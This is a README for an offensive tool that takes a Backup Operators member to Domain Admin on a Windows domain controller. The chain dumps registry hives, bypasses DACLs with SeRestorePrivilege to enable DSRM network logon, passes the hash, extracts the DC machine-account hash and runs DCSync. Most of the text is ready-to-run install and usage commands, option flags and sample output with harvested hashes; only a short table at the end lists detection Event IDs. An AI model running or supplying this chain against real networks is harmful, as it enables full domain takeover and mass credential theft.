# BackupOperatorsDump v3.0

Full **Backup Operators → Domain Admin** attack chain. Single command, no admin credentials needed.

## Attack Chain

```
Phase 1: RegSaveKey SAM + SYSTEM          → DSRM Administrator hash
Phase 2: REG_OPTION_BACKUP_RESTORE write  → DsrmAdminLogonBehavior = 2
Phase 3: DSRM Pass-the-Hash              → Local Admin on DC (network logon)
Phase 4: Cleanup                          → Remove DsrmAdminLogonBehavior
Phase 5: RegSaveKey SECURITY              → $MACHINE.ACC (DC machine account hash)
Phase 6: DCSync via $MACHINE.ACC          → ALL domain hashes
```

## How It Works

### SeRestorePrivilege DACL Bypass

Backup Operators have both `SeBackupPrivilege` (read) and `SeRestorePrivilege` (write). When opening a registry key via MS-RRP with `REG_OPTION_BACKUP_RESTORE` (0x00000004), the Windows Security Reference Monitor **bypasses DACL checks** if the caller has `SeRestorePrivilege`. This allows writing to any registry key, including `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.

### DSRM Pass-the-Hash

Setting `DsrmAdminLogonBehavior=2` enables network logon with the DSRM Administrator account. The DSRM password is stored in the DC's SAM database (separate from the domain Administrator). With PtH using `domain=DC_HOSTNAME`, we get local admin access on the DC.

### $MACHINE.ACC → DCSync

With local admin, the SECURITY hive becomes accessible. It contains `$MACHINE.ACC` — the DC's machine account NT hash. Every DC machine account has DCSync rights (DS-Replication-Get-Changes-All) by default, enabling full domain hash extraction.

### SAM ≠ NTDS on a Domain Controller

| | SAM (Local) | NTDS.dit (Domain) |
|---|---|---|
| **Administrator** | DSRM password | Domain Administrator |
| **Same hash?** | **No** | Different accounts |

## Installation

### pipx (recommended)

```bash
pipx install git+https://github.com/TazeguID/BackupOperatorsDump.git
```

### pip

```bash
pip install git+https://github.com/TazeguID/BackupOperatorsDump.git
```

### From source

```bash
git clone https://github.com/TazeguID/BackupOperatorsDump.git
cd BackupOperatorsDump
pip install .
```

## Usage

```bash
# Full chain: Backup Operators → Domain Admin (single command)
backupoperatorsdump -t <DC_IP> -u <backup_ops_user> -p '<password>' -d <domain>

# With pass-the-hash
backupoperatorsdump -t <DC_IP> -u <user> -H ':<NT_HASH>' -d <domain>

# Save output to specific directory
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> -o /tmp/loot

# Registry dump only (no DSRM exploitation)
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --reg-only

# Don't cleanup (leave DsrmAdminLogonBehavior=2)
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --no-cleanup
```

## Options

| Flag | Description |
|---|---|
| `-t`, `--target` | DC IP address (required) |
| `-u`, `--username` | Backup Operators member username (required) |
| `-p`, `--password` | Password |
| `-H`, `--hashes` | NTLM hash (`LM:NT` or `:NT`) |
| `-d`, `--domain` | Domain name |
| `-o`, `--output` | Output directory (default: cwd) |
| `--dc-hostname` | DC NetBIOS name (auto-detected from SMB) |
| `--reg-only` | Only dump SAM+SYSTEM, skip DSRM chain |
| `--no-cleanup` | Don't restore registry after exploit |
| `--remote-path` | Remote temp path (default: `C:\Users\Public`) |

## Example Output

```
Phase 1: Registry Hive Extraction (SAM + SYSTEM)
  [+] DSRM Administrator hash: 3b9d5f8125d916785ea7346e32f3c158
  [!] This is the DSRM password, NOT the domain Administrator

Phase 2: DSRM Unlock (SeRestorePrivilege → REG_OPTION_BACKUP_RESTORE)
  [+] DACL bypass successful (SeRestorePrivilege)
  [+] DsrmAdminLogonBehavior = 2 → DSRM network logon ENABLED

Phase 3: DSRM Pass-the-Hash (domain=DC01)
  [+] LOCAL ADMIN via DSRM PtH!
  [+] HKLM\SECURITY → SECURITY.hiv

Phase 4: Cleanup (restore DsrmAdminLogonBehavior)
  [+] DsrmAdminLogonBehavior DELETED

Phase 5: Extract $MACHINE.ACC from SECURITY hive
  [+] $MACHINE.ACC (DC01$) NT hash: 55f0450a567294cdd7024cf36582d07b

Phase 6: DCSync via $MACHINE.ACC
  Administrator:500:...:1d7c113c207344eaf0eca5cca64e5fff:::
  krbtgt:502:...:87ed2ddea933817687dfdb170b62da86:::
  ... 20 domain hashes ...

  CHAIN COMPLETE: Backup Operators → Domain Admin
```

## Prerequisites

- Python 3.8+
- impacket >= 0.11.0
- User must be a member of the **Backup Operators** group
- Remote Registry service reachable (TCP/445)
- Target must be a Domain Controller

## Detection

| Phase | Event ID | Indicator |
|---|---|---|
| Registry read | 4657 | SAM/SYSTEM hive access |
| Registry write | 4657 | `DsrmAdminLogonBehavior` value created/modified |
| DSRM logon | 4624 | Logon Type 3 with local Administrator account |
| DCSync | 4662 | DS-Replication-Get-Changes-All |
| Special logon | 4672 | SeBackupPrivilege / SeRestorePrivilege |

## References

- [Backup Operators DACL Bypass via SeRestorePrivilege](https://www.bordergate.co.uk/backup-operator-to-domain-admin/)
- [DsrmAdminLogonBehavior](https://adsecurity.org/?p=1714)
- [REG_OPTION_BACKUP_RESTORE](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw)
- [$MACHINE.ACC DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [impacket MS-RRP](https://github.com/fortra/impacket)

## License

MIT
